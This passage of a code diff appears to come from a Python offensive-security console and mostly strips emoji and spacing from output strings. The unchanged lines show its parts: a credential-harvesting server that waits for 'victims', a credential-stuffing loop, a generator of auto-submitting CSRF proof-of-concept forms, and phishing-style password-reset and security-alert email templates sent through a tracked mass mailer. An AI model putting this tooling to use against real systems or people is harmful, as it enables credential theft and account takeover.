+                        print(f" {Fore.WHITE}{key:12s}:{Style.RESET_ALL} {value}")
                 
                 print(f"{Fore.GREEN}{'═' * 70}{Style.RESET_ALL}\n")
                 
@@ -17749,11 +17749,11 @@ ignore_broadcast_ssid=0"""
             server_address = ('', profile['port'])
             httpd = HTTPServer(server_address, handler_factory)
             
-            print(f"{Fore.GREEN}[✓] Server started successfully!{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}[] Server started successfully!{Style.RESET_ALL}")
             print(f"{Fore.CYAN}[*] Listening on {profile['lhost']}:{profile['port']}{Style.RESET_ALL}")
             print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop the server{Style.RESET_ALL}\n")
             print(f"{Fore.WHITE}{'═' * 70}{Style.RESET_ALL}\n")
-            print(f"{Fore.CYAN}[📊] Waiting for victims...{Style.RESET_ALL}\n")
+            print(f"{Fore.CYAN}[] Waiting for victims...{Style.RESET_ALL}\n")
             
             # Serve forever
             try:
@@ -17765,16 +17765,16 @@ ignore_broadcast_ssid=0"""
                 # Display final statistics
                 self._display_harvester_statistics(harvester)
                 
-                print(f"{Fore.GREEN}[✓] Server stopped{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}[] Server stopped{Style.RESET_ALL}")
                 
         except OSError as e:
             if 'Address already in use' in str(e):
-                print(f"{Fore.RED}[✗] Port {profile['port']} is already in use{Style.RESET_ALL}")
+                print(f"{Fore.RED}[] Port {profile['port']} is already in use{Style.RESET_ALL}")
                 print(f"{Fore.YELLOW}[*] Try a different port with: set port <number>{Style.RESET_ALL}")
             else:
-                print(f"{Fore.RED}[✗] Server error: {str(e)}{Style.RESET_ALL}")
+                print(f"{Fore.RED}[] Server error: {str(e)}{Style.RESET_ALL}")
         except Exception as e:
-            print(f"{Fore.RED}[✗] Fatal error: {str(e)}{Style.RESET_ALL}")
+            print(f"{Fore.RED}[] Fatal error: {str(e)}{Style.RESET_ALL}")
             import traceback
             traceback.print_exc()
     
@@ -17784,25 +17784,25 @@ ignore_broadcast_ssid=0"""
         runtime = time.time() - harvester['start_time']
         
         print(f"\n{Fore.CYAN}{'═' * 70}{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}[📊] FINAL STATISTICS{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[] FINAL STATISTICS{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═' * 70}{Style.RESET_ALL}\n")
         
-        print(f"{Fore.YELLOW}[⏱️] Runtime:{Style.RESET_ALL} {int(runtime // 60)}m {int(runtime % 60)}s")
-        print(f"{Fore.YELLOW}[👥] Total Visits:{Style.RESET_ALL} {stats['total_visits']}")
-        print(f"{Fore.YELLOW}[🔑] Credentials Captured:{Style.RESET_ALL} {stats['total_captures']}")
-        print(f"{Fore.YELLOW}[🌐] Unique IPs:{Style.RESET_ALL} {len(stats['unique_ips'])}")
+        print(f"{Fore.YELLOW}[️] Runtime:{Style.RESET_ALL} {int(runtime // 60)}m {int(runtime % 60)}s")
+        print(f"{Fore.YELLOW}[] Total Visits:{Style.RESET_ALL} {stats['total_visits']}")
+        print(f"{Fore.YELLOW}[] Credentials Captured:{Style.RESET_ALL} {stats['total_captures']}")
+        print(f"{Fore.YELLOW}[] Unique IPs:{Style.RESET_ALL} {len(stats['unique_ips'])}")
         
         if stats['by_country']:
-            print(f"\n{Fore.CYAN}[📍] By Country:{Style.RESET_ALL}")
+            print(f"\n{Fore.CYAN}[] By Country:{Style.RESET_ALL}")
             for country, count in sorted(stats['by_country'].items(), key=lambda x: x[1], reverse=True)[:5]:
-                print(f"  {country:20s}: {count}")
+                print(f" {country:20s}: {count}")
         
         if stats['by_browser']:
-            print(f"\n{Fore.CYAN}[🌐] By Browser:{Style.RESET_ALL}")
+            print(f"\n{Fore.CYAN}[] By Browser:{Style.RESET_ALL}")
             for browser, count in sorted(stats['by_browser'].items(), key=lambda x: x[1], reverse=True)[:5]:
-                print(f"  {browser:20s}: {count}")
+                print(f" {browser:20s}: {count}")
         
-        print(f"\n{Fore.GREEN}[✓] Data saved to: {harvester['profile']['db_file']}{Style.RESET_ALL}")
+        print(f"\n{Fore.GREEN}[] Data saved to: {harvester['profile']['db_file']}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═' * 70}{Style.RESET_ALL}\n")
     
     def run_website_cloner(self):
@@ -17862,7 +17862,7 @@ ignore_broadcast_ssid=0"""
         if not forms:
             print(f"{Fore.YELLOW}[!] No HTML forms discovered within scope{Style.RESET_ALL}")
             if discovery['errors']:
-                print(f"{Fore.YELLOW}    Errors observed: {len(discovery['errors'])}{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW} Errors observed: {len(discovery['errors'])}{Style.RESET_ALL}")
             return
 
         analysis = self._analyze_csrf_forms(forms, opts)
@@ -18222,12 +18222,12 @@ ignore_broadcast_ssid=0"""
             if not name:
                 continue
             safe_value = html.escape(value)
-            inputs_html.append(f"    <input type=\"hidden\" name=\"{html.escape(name)}\" value=\"{safe_value}\">")
-        inputs_html.append("    <input type=\"submit\" value=\"CSRF PoC\">")
-        form_html = ["<html>", "<body>", f"  <form action=\"{form['action']}\" method=\"{form['method'].lower()}\" id=\"csrf_poc\" target=\"_blank\">"]
+            inputs_html.append(f" <input type=\"hidden\" name=\"{html.escape(name)}\" value=\"{safe_value}\">")
+        inputs_html.append(" <input type=\"submit\" value=\"CSRF PoC\">")
+        form_html = ["<html>", "<body>", f" <form action=\"{form['action']}\" method=\"{form['method'].lower()}\" id=\"csrf_poc\" target=\"_blank\">"]
         form_html.extend(inputs_html)
-        form_html.append("  </form>")
-        form_html.append("  <script>document.getElementById('csrf_poc').submit();</script>")
+        form_html.append(" </form>")
+        form_html.append(" <script>document.getElementById('csrf_poc').submit();</script>")
         form_html.append("</body>")
         form_html.append("</html>")
         return '\n'.join(form_html)
@@ -18327,21 +18327,21 @@ ignore_broadcast_ssid=0"""
         if vulns:
             print(f"\n{Fore.RED}[!] Confirmed Findings ({len(vulns)}){Style.RESET_ALL}")
             for entry in vulns[:6]:
-                print(f"  - {entry['severity']} {entry['finding']} @ {entry['action']} ({entry['method']})")
+                print(f" - {entry['severity']} {entry['finding']} @ {entry['action']} ({entry['method']})")
         else:
             print(f"\n{Fore.GREEN}[+] No direct CSRF gaps confirmed in analyzed forms{Style.RESET_ALL}")
         if warnings or summary['cookie_findings'] or summary['referrer_findings']:
             print(f"\n{Fore.YELLOW}[*] Hardening Opportunities{Style.RESET_ALL}")
             for warn in warnings[:5]:
-                print(f"  - {warn['category']}: {warn['detail']}")
+                print(f" - {warn['category']}: {warn['detail']}")
             for cookie_warn in summary['cookie_findings'][:3]:
-                print(f"  - Cookie: {cookie_warn['detail']}")
+                print(f" - Cookie: {cookie_warn['detail']}")
             for ref_warn in summary['referrer_findings'][:2]:
-                print(f"  - Header: {ref_warn['detail']}")
+                print(f" - Header: {ref_warn['detail']}")
         if summary['token_verification']:
             print(f"\n{Fore.YELLOW}[*] Token Rotation Checks{Style.RESET_ALL}")
             for finding in summary['token_verification']:
-                print(f"  - {finding['detail']}")
+                print(f" - {finding['detail']}")
 
     def _export_csrf_results(self, summary):
         safe_target = re.sub(r'[^a-zA-Z0-9._-]', '_', summary['target'])
@@ -18360,47 +18360,47 @@ ignore_broadcast_ssid=0"""
             fh.write("-" * 78 + "\n")
             if summary['vulnerabilities']:
                 for vuln in summary['vulnerabilities']:
-                    fh.write(f"  - {vuln['severity']} {vuln['finding']} ({vuln['method']} {vuln['action']})\n")
-                    fh.write(f"    Detail: {vuln['detail']}\n")
+                    fh.write(f" - {vuln['severity']} {vuln['finding']} ({vuln['method']} {vuln['action']})\n")
+                    fh.write(f" Detail: {vuln['detail']}\n")
                     if vuln.get('poc'):
-                        fh.write("    Proof of Concept:\n")
-                        fh.write("    ---BEGIN POC---\n")
-                        fh.write('\n'.join(f"    {line}" for line in vuln['poc'].split('\n')))
-                        fh.write("\n    ---END POC---\n")
+                        fh.write(" Proof of Concept:\n")
+                        fh.write(" ---BEGIN POC---\n")
+                        fh.write('\n'.join(f" {line}" for line in vuln['poc'].split('\n')))
+                        fh.write("\n ---END POC---\n")
             else:
-                fh.write("  None detected\n")
+                fh.write(" None detected\n")
             fh.write("\nWarnings:\n")
             fh.write("-" * 78 + "\n")
             if summary['warnings']:
                 for warn in summary['warnings']:
-                    fh.write(f"  - {warn['category']}: {warn['detail']}\n")
+                    fh.write(f" - {warn['category']}: {warn['detail']}\n")
             else:
-                fh.write("  None\n")
+                fh.write(" None\n")
             if summary['cookie_findings']:
                 fh.write("\nCookie Observations:\n")
                 fh.write("-" * 78 + "\n")
                 for cookie in summary['cookie_findings']:
-                    fh.write(f"  - {cookie['cookie'] if cookie.get('cookie') else 'Cookie'}: {cookie['detail']}\n")
+                    fh.write(f" - {cookie['cookie'] if cookie.get('cookie') else 'Cookie'}: {cookie['detail']}\n")
             if summary['referrer_findings']:
                 fh.write("\nHeader Observations:\n")
                 fh.write("-" * 78 + "\n")
                 for ref in summary['referrer_findings']:
-                    fh.write(f"  - {ref['detail']}\n")
+                    fh.write(f" - {ref['detail']}\n")
             if summary['token_verification']:
                 fh.write("\nToken Verification:\n")
                 fh.write("-" * 78 + "\n")
                 for finding in summary['token_verification']:
-                    fh.write(f"  - {finding['detail']}\n")
+                    fh.write(f" - {finding['detail']}\n")
             fh.write("\nMeta/JS Tokens:\n")
             fh.write("-" * 78 + "\n")
             if summary['meta_tokens']:
                 for meta in summary['meta_tokens'][:10]:
-                    fh.write(f"  - {meta['name']} @ {meta['url']}: {meta['content']}\n")
+                    fh.write(f" - {meta['name']} @ {meta['url']}: {meta['content']}\n")
             else:
-                fh.write("  None\n")
+                fh.write(" None\n")
         print(f"{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
-        print(f"  • {json_file}")
-        print(f"  • {txt_file}")
+        print(f" • {json_file}")
+        print(f" • {txt_file}")
     
     def run_credential_stuffing(self):
         """Credential stuffing attack"""
@@ -18443,7 +18443,7 @@ ignore_broadcast_ssid=0"""
         
         valid_creds = []
         
-        for username, password in credentials[:50]:  # Limit for demo
+        for username, password in credentials[:50]: # Limit for demo
             print(f"{Fore.BLUE}[*] Trying: {username}:{password[:3]}***{Style.RESET_ALL}")
             
             try:
@@ -18456,7 +18456,7 @@ ignore_broadcast_ssid=0"""
                     print(f"{Fore.GREEN}[+] VALID: {username}:{password}{Style.RESET_ALL}")
                     valid_creds.append((username, password))
                 
-                time.sleep(0.5)  # Rate limiting
+                time.sleep(0.5) # Rate limiting
             except Exception as e:
                 print(f"{Fore.RED}[-] Error: {str(e)[:50]}{Style.RESET_ALL}")
         
@@ -18535,7 +18535,7 @@ ignore_broadcast_ssid=0"""
                 <p>Hello {{first_name}},</p>
                 <p>We received a request to reset your password.</p>
                 <div style="background:#f8d7da;padding:15px;margin:15px 0;border-radius:5px;border-left:4px solid #dc3545;">
-                <p><strong>⚠ Security Notice:</strong> If you didn't request this, please ignore this email.</p>
+                <p><strong> Security Notice:</strong> If you didn't request this, please ignore this email.</p>
                 </div>
                 <a href="{{link}}" style="display:inline-block;background:#dc3545;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;">Reset Password</a>
                 <p style="margin-top:20px;font-size:12px;color:#666;">This link expires in 24 hours.</p>
@@ -18547,7 +18547,7 @@ ignore_broadcast_ssid=0"""
                 'preheader': 'Action may be required to secure your account',
                 'category': 'security',
                 'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
-                <h2 style="color:#dc3545;">🔒 Security Alert</h2>
+                <h2 style="color:#dc3545;"> Security Alert</h2>
                 <p>Hello {{first_name}},</p>
                 <p>We detected unusual activity on your account.</p>
                 <div style="background:#fff3cd;padding:15px;margin:15px 0;border-radius:5px;">
@@ -18561,12 +18561,12 @@ ignore_broadcast_ssid=0"""
             },
             'promotional': {
                 'name': 'Promotional Offer',
-                'subject': '🎉 Special Offer: {{discount}}% Off - {{company}}',
+                'subject': ' Special Offer: {{discount}}% Off - {{company}}',
                 'preheader': 'Limited time offer just for you',
                 'category': 'marketing',
                 'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
                 <div style="background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;padding:30px;border-radius:10px;text-align:center;">
-                <h1 style="margin:0;font-size:32px;">🎉 Special Offer!</h1>
+                <h1 style="margin:0;font-size:32px;"> Special Offer!</h1>
                 <p style="font-size:24px;margin:10px 0;">{{discount}}% OFF</p>
                 <p>Just for you, {{first_name}}!</p>
                 </div>
@@ -18586,9 +18586,9 @@ ignore_broadcast_ssid=0"""
                 <h1 style="color:#007bff;">You're Invited!</h1>
                 <div style="background:#e7f3ff;padding:20px;margin:20px 0;border-radius:8px;">
                 <h2 style="color:#0056b3;margin-top:0;">{{event_name}}</h2>
-                <p><strong>📅 Date:</strong> {{event_date}}</p>
-                <p><strong>🕐 Time:</strong> {{event_time}}</p>
-                <p><strong>📍 Location:</strong> {{event_location}}</p>
+                <p><strong> Date:</strong> {{event_date}}</p>
+                <p><strong> Time:</strong> {{event_time}}</p>
+                <p><strong> Location:</strong> {{event_location}}</p>
                 </div>
                 <p>Dear {{first_name}},</p>
                 <p>{{event_description}}</p>
@@ -18597,12 +18597,12 @@ ignore_broadcast_ssid=0"""
             },
             'welcome': {
                 'name': 'Welcome Email',
-                'subject': 'Welcome to {{company}}! 🎉',
+                'subject': 'Welcome to {{company}}! ',
                 'preheader': 'Get started with your new account',
                 'category': 'onboarding',
                 'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
                 <div style="text-align:center;padding:30px;background:#f8f9fa;border-radius:10px;">
-                <h1 style="color:#28a745;margin:0;">Welcome! 🎉</h1>
+                <h1 style="color:#28a745;margin:0;">Welcome! </h1>
                 <p style="font-size:18px;color:#666;">We're excited to have you</p>
                 </div>
                 <div style="padding:20px 0;">
@@ -18623,7 +18623,7 @@ ignore_broadcast_ssid=0"""
                 <p>Hello {{first_name}},</p>
                 <p>We'd love to hear what you think about {{company}}.</p>
                 <div style="background:#e7f3ff;padding:20px;margin:20px 0;border-radius:8px;text-align:center;">
-                <p style="font-size:18px;margin:0;">📊 Take our quick survey</p>
+                <p style="font-size:18px;margin:0;"> Take our quick survey</p>
                 <p style="color:#666;font-size:14px;">It takes less than 5 minutes</p>
                 </div>
                 <a href="{{link}}" style="display:inline-block;background:#17a2b8;color:white;padding:12px 24px;text-decoration:none;border-radius:5px;">Start Survey</a>
@@ -18631,11 +18631,11 @@ ignore_broadcast_ssid=0"""
             },
             'abandoned_cart': {
                 'name': 'Abandoned Cart',
-                'subject': 'You Left Something Behind... 🛒',
+                'subject': 'You Left Something Behind... ',
                 'preheader': 'Complete your order and save {{discount}}%',
                 'category': 'ecommerce',
                 'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
-                <h2>Don't Forget Your Items! 🛒</h2>
+                <h2>Don't Forget Your Items! </h2>
                 <p>Hi {{first_name}},</p>
                 <p>You left some items in your cart. Complete your order now and save {{discount}}%!</p>
                 <div style="background:#f8f9fa;padding:20px;margin:20px 0;border-radius:8px;">
@@ -18669,7 +18669,7 @@ ignore_broadcast_ssid=0"""
                 'category': 'referral',
                 'html': '''<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;padding:20px;">
                 <div style="background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;padding:30px;border-radius:10px;text-align:center;">
-                <h1>💝 Refer & Earn</h1>
+                <h1> Refer & Earn</h1>
                 <p style="font-size:20px;">Get {{reward}} for each friend!</p>
                 </div>
                 <p>Hi {{first_name}},</p>
@@ -18689,30 +18689,30 @@ ignore_broadcast_ssid=0"""
         print(f"{Fore.CYAN}{'MASS MAILER CAMPAIGN CONFIGURATION':^70}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
         
-        print(f"{Fore.GREEN}📧 Campaign Details:{Style.RESET_ALL}")
-        print(f"   Name: {Fore.WHITE}{config.get('campaign_name', 'Unnamed')}{Style.RESET_ALL}")
-        print(f"   Template: {Fore.WHITE}{config.get('template', 'None')}{Style.RESET_ALL}")
-        print(f"   Targets: {Fore.WHITE}{config.get('targets', 'None')}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN} Campaign Details:{Style.RESET_ALL}")
+        print(f" Name: {Fore.WHITE}{config.get('campaign_name', 'Unnamed')}{Style.RESET_ALL}")
+        print(f" Template: {Fore.WHITE}{config.get('template', 'None')}{Style.RESET_ALL}")
+        print(f" Targets: {Fore.WHITE}{config.get('targets', 'None')}{Style.RESET_ALL}")
         
-        print(f"\n{Fore.YELLOW}📬 Email Settings:{Style.RESET_ALL}")
-        print(f"   From: {Fore.WHITE}{config.get('from_name', 'N/A')} <{config.get('from_email', 'N/A')}>{Style.RESET_ALL}")
-        print(f"   Reply-To: {Fore.WHITE}{config.get('reply_to', 'N/A')}{Style.RESET_ALL}")
-        print(f"   Subject: {Fore.WHITE}{config.get('subject', 'Auto-generated')}{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW} Email Settings:{Style.RESET_ALL}")
+        print(f" From: {Fore.WHITE}{config.get('from_name', 'N/A')} <{config.get('from_email', 'N/A')}>{Style.RESET_ALL}")
+        print(f" Reply-To: {Fore.WHITE}{config.get('reply_to', 'N/A')}{Style.RESET_ALL}")
+        print(f" Subject: {Fore.WHITE}{config.get('subject', 'Auto-generated')}{Style.RESET_ALL}")
         
-        print(f"\n{Fore.BLUE}🔧 SMTP Configuration:{Style.RESET_ALL}")
-        print(f"   Server: {Fore.WHITE}{config.get('smtp_server', 'N/A')}:{config.get('smtp_port', '587')}{Style.RESET_ALL}")
-        print(f"   TLS: {Fore.GREEN if config.get('use_tls', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('use_tls', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
+        print(f"\n{Fore.BLUE} SMTP Configuration:{Style.RESET_ALL}")
+        print(f" Server: {Fore.WHITE}{config.get('smtp_server', 'N/A')}:{config.get('smtp_port', '587')}{Style.RESET_ALL}")
+        print(f" TLS: {Fore.GREEN if config.get('use_tls', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('use_tls', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
         
-        print(f"\n{Fore.MAGENTA}⚡ Performance:{Style.RESET_ALL}")
-        print(f"   Threads: {Fore.WHITE}{config.get('threads', '10')}{Style.RESET_ALL}")
-        print(f"   Rate Limit: {Fore.WHITE}{config.get('rate_limit', '50')} emails/min{Style.RESET_ALL}")
-        print(f"   Batch Size: {Fore.WHITE}{config.get('batch_size', '100')}{Style.RESET_ALL}")
+        print(f"\n{Fore.MAGENTA} Performance:{Style.RESET_ALL}")
+        print(f" Threads: {Fore.WHITE}{config.get('threads', '10')}{Style.RESET_ALL}")
+        print(f" Rate Limit: {Fore.WHITE}{config.get('rate_limit', '50')} emails/min{Style.RESET_ALL}")
+        print(f" Batch Size: {Fore.WHITE}{config.get('batch_size', '100')}{Style.RESET_ALL}")
         
-        print(f"\n{Fore.CYAN}📊 Features:{Style.RESET_ALL}")
-        print(f"   Personalization: {Fore.GREEN if config.get('personalize', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('personalize', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
-        print(f"   Open Tracking: {Fore.GREEN if config.get('track_opens', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('track_opens', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
-        print(f"   Click Tracking: {Fore.GREEN if config.get('track_clicks', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('track_clicks', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
-        print(f"   A/B Testing: {Fore.GREEN if config.get('ab_testing', 'false') == 'true' else Fore.RED}{'Enabled' if config.get('ab_testing', 'false') == 'true' else 'Disabled'}{Style.RESET_ALL}")
+        print(f"\n{Fore.CYAN} Features:{Style.RESET_ALL}")
+        print(f" Personalization: {Fore.GREEN if config.get('personalize', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('personalize', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
+        print(f" Open Tracking: {Fore.GREEN if config.get('track_opens', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('track_opens', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
+        print(f" Click Tracking: {Fore.GREEN if config.get('track_clicks', 'true') == 'true' else Fore.RED}{'Enabled' if config.get('track_clicks', 'true') == 'true' else 'Disabled'}{Style.RESET_ALL}")
+        print(f" A/B Testing: {Fore.GREEN if config.get('ab_testing', 'false') == 'true' else Fore.RED}{'Enabled' if config.get('ab_testing', 'false') == 'true' else 'Disabled'}{Style.RESET_ALL}")
         
         print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
     
@@ -18816,14 +18816,14 @@ ignore_broadcast_ssid=0"""
             conn.commit()
             conn.close()
             
-            print(f"{Fore.GREEN}✓ Database initialized successfully{Style.RESET_ALL}")
+            print(f"{Fore.GREEN} Database initialized successfully{Style.RESET_ALL}")
             print(f"{Fore.CYAN}→ Database: {Fore.WHITE}{db_file}{Style.RESET_ALL}")
             print(f"{Fore.CYAN}→ Campaign ID: {Fore.WHITE}{campaign_id}{Style.RESET_ALL}\n")
             
             return campaign_id
             
         except Exception as e:
-            print(f"{Fore.RED}✗ Database initialization failed: {str(e)}{Style.RESET_ALL}")
+            print(f"{Fore.RED} Database initialization failed: {str(e)}{Style.RESET_ALL}")
             return None
     
     def _load_mass_mailer_recipients(self, config, campaign_id):
@@ -18834,7 +18834,7 @@ ignore_broadcast_ssid=0"""
         print(f"{Fore.YELLOW}Loading recipients from: {Fore.WHITE}{targets_file}{Style.RESET_ALL}")
         
         if not os.path.exists(targets_file):
-            print(f"{Fore.RED}✗ Targets file not found{Style.RESET_ALL}")
+            print(f"{Fore.RED} Targets file not found{Style.RESET_ALL}")
             return 0
         
         recipients = []
@@ -18856,7 +18856,7 @@ ignore_broadcast_ssid=0"""
                     # Validate email
                     if config.get('validate_emails', 'true') == 'true':
                         if not email_regex.match(email) or '..' in email:
-                            print(f"{Fore.YELLOW}⚠  Invalid email on line {line_num}: {email}{Style.RESET_ALL}")
+                            print(f"{Fore.YELLOW} Invalid email on line {line_num}: {email}{Style.RESET_ALL}")
                             continue
                     
                     recipient = {
@@ -18903,7 +18903,7 @@ ignore_broadcast_ssid=0"""
             conn.commit()
             conn.close()
             
-            print(f"{Fore.GREEN}✓ Loaded {len(recipients)} recipients{Style.RESET_ALL}")
+            print(f"{Fore.GREEN} Loaded {len(recipients)} recipients{Style.RESET_ALL}")
             if config.get('ab_testing', 'false') == 'true':
                 variant_a = len([r for r in recipients if r['ab_variant'] == 'A'])
                 variant_b = len([r for r in recipients if r['ab_variant'] == 'B'])
@@ -18912,7 +18912,7 @@ ignore_broadcast_ssid=0"""
             return len(recipients)
             
         except Exception as e:
-            print(f"{Fore.RED}✗ Failed to load recipients: {str(e)}{Style.RESET_ALL}")
+            print(f"{Fore.RED} Failed to load recipients: {str(e)}{Style.RESET_ALL}")
             return 0
     
     def _execute_mass_mailer_campaign(self, config, campaign_id):
@@ -18974,7 +18974,7 @@ ignore_broadcast_ssid=0"""
                 sent_count += 1
                 
                 if i % 10 == 0:
-                    print(f"{Fore.GREEN}✓ Sent: {sent_count}/{len(recipients)}{Style.RESET_ALL}", end='\r')
+                    print(f"{Fore.GREEN} Sent: {sent_count}/{len(recipients)}{Style.RESET_ALL}", end='\r')
                 
             except Exception as e:
                 failed_count += 1
@@ -18996,7 +18996,7 @@ ignore_broadcast_ssid=0"""
         conn.commit()
         conn.close()
         
-        print(f"\n{Fore.GREEN}✓ Campaign execution completed{Style.RESET_ALL}")
+        print(f"\n{Fore.GREEN} Campaign execution completed{Style.RESET_ALL}")
     
     def _generate_mass_mailer_email(self, template_content, recipient, config):
         """Generate personalized email content"""
@@ -19051,24 +19051,24 @@ ignore_broadcast_ssid=0"""
             duration = campaign[7] - campaign[6]
             print(f"{Fore.YELLOW}Duration: {Fore.WHITE}{duration//60}m {duration%60}s{Style.RESET_ALL}")
         
-        print(f"\n{Fore.CYAN}📧 Email Statistics:{Style.RESET_ALL}")
-        print(f"   Total Recipients: {Fore.WHITE}{campaign[9]}{Style.RESET_ALL}")
-        print(f"   ✓ Sent: {Fore.GREEN}{campaign[10]}{Style.RESET_ALL}")
-        print(f"   ✗ Failed: {Fore.RED}{campaign[11]}{Style.RESET_ALL}")
+        print(f"\n{Fore.CYAN} Email Statistics:{Style.RESET_ALL}")
+        print(f" Total Recipients: {Fore.WHITE}{campaign[9]}{Style.RESET_ALL}")
+        print(f" Sent: {Fore.GREEN}{campaign[10]}{Style.RESET_ALL}")
+        print(f" Failed: {Fore.RED}{campaign[11]}{Style.RESET_ALL}")
         
         if campaign[10] > 0:
             success_rate = (campaign[10] / campaign[9]) * 100
-            print(f"   Success Rate: {Fore.GREEN}{success_rate:.1f}%{Style.RESET_ALL}")
+            print(f" Success Rate: {Fore.GREEN}{success_rate:.1f}%{Style.RESET_ALL}")
         
-        print(f"\n{Fore.MAGENTA}📊 Engagement Metrics:{Style.RESET_ALL}")
-        print(f"   Opens: {Fore.WHITE}{campaign[12]} ({(campaign[12]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
-        print(f"   Clicks: {Fore.WHITE}{campaign[13]} ({(campaign[13]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
-        print(f"   Unsubscribes: {Fore.WHITE}{campaign[14]} ({(campaign[14]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
-        print(f"   Bounces: {Fore.WHITE}{campaign[15]} ({(campaign[15]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
+        print(f"\n{Fore.MAGENTA} Engagement Metrics:{Style.RESET_ALL}")
+        print(f" Opens: {Fore.WHITE}{campaign[12]} ({(campaign[12]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
+        print(f" Clicks: {Fore.WHITE}{campaign[13]} ({(campaign[13]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
+        print(f" Unsubscribes: {Fore.WHITE}{campaign[14]} ({(campaign[14]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
+        print(f" Bounces: {Fore.WHITE}{campaign[15]} ({(campaign[15]/campaign[10]*100) if campaign[10] > 0 else 0:.1f}%){Style.RESET_ALL}")
         
         # A/B Testing results
-        if campaign[17]:  # ab_testing
-            print(f"\n{Fore.BLUE}🔬 A/B Testing Results:{Style.RESET_ALL}")
+        if campaign[17]: # ab_testing
+            print(f"\n{Fore.BLUE} A/B Testing Results:{Style.RESET_ALL}")
             cursor.execute('''
                 SELECT ab_variant, COUNT(*) as sent, 
                        SUM(CASE WHEN opened_at IS NOT NULL THEN 1 ELSE 0 END) as opens,
@@ -19081,7 +19081,7 @@ ignore_broadcast_ssid=0"""
             for variant in variants:
                 open_rate = (variant[2]/variant[1]*100) if variant[1] > 0 else 0
                 click_rate = (variant[3]/variant[1]*100) if variant[1] > 0 else 0
-                print(f"   Variant {variant[0]}: {variant[1]} sent, {variant[2]} opens ({open_rate:.1f}%), {variant[3]} clicks ({click_rate:.1f}%)")
+                print(f" Variant {variant[0]}: {variant[1]} sent, {variant[2]} opens ({open_rate:.1f}%), {variant[3]} clicks ({click_rate:.1f}%)")
         
         print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
         
@@ -19118,7 +19118,7 @@ ignore_broadcast_ssid=0"""
                 writer.writerow(['Email', 'First Name', 'Last Name', 'Company', 'Status', 'Sent At', 'Opened At', 'Clicked At', 'Variant'])
                 for r in recipients:
                     writer.writerow(r)
-            print(f"{Fore.GREEN}✓ CSV exported: {Fore.WHITE}{csv_file}{Style.RESET_ALL}")
+            print(f"{Fore.GREEN} CSV exported: {Fore.WHITE}{csv_file}{Style.RESET_ALL}")
         
         # JSON Export
         if export_format in ['json', 'all']:
@@ -19155,13 +19155,13 @@ ignore_broadcast_ssid=0"""
             }
             with open(json_file, 'w', encoding='utf-8') as f:
                 json.dump(data, f, indent=2)
-            print(f"{Fore.GREEN}✓ JSON exported: {Fore.WHITE}{json_file}{Style.RESET_ALL}")
+            print(f"{Fore.GREEN} JSON exported: {Fore.WHITE}{json_file}{Style.RESET_ALL}")
         
         # HTML Report
         if export_format in ['html', 'all']:
             html_file = f"{campaign_name}_report.html"
             self._generate_mass_mailer_html_report(campaign, recipients, html_file)
-            print(f"{Fore.GREEN}✓ HTML report: {Fore.WHITE}{html_file}{Style.RESET_ALL}")
+            print(f"{Fore.GREEN} HTML report: {Fore.WHITE}{html_file}{Style.RESET_ALL}")
     
     def _generate_mass_mailer_html_report(self, campaign, recipients, output_file):
         """Generate professional HTML report"""
@@ -19183,7 +19183,7 @@ tr:hover {{ background: #f8f9fa; }}
 .status-failed {{ color: #dc3545; font-weight: bold; }}
 </style></head><body>
 <div class="container">
-<h1>📧 Mass Mailer Campaign Report</h1>
+<h1> Mass Mailer Campaign Report</h1>
 <p><strong>Campaign:</strong> {campaign[1]}</p>
 <p><strong>Template:</strong> {campaign[2]}</p>
 <div class="stats">
@@ -19220,14 +19220,14 @@ tr:hover {{ background: #f8f9fa; }}
         template_name = config.get('template', 'newsletter')
         
         if template_name not in templates:
